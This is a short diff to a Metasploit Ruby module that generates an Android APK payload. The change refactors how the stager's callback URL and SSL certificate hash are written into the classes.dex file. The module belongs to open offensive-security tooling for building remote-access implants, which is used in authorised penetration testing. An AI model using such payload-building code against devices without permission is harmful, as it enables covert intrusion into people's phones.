@@ -41,7 +41,6 @@ module MetasploitModule
     url << generate_uri_uuid_mode(:init_java, uri_req_len)
 
     classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
 
     verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                          datastore['HandlerSSLCert'])
@@ -50,7 +49,7 @@ module MetasploitModule
         string_sub(classes, 'WWWW                                        ', hash)
     end
 
-    apply_options(classes)
+    apply_options(classes, opts, url)
 
     jar = Rex::Zip::Jar.new
     jar.add_file("classes.dex", fix_dex_header(classes))
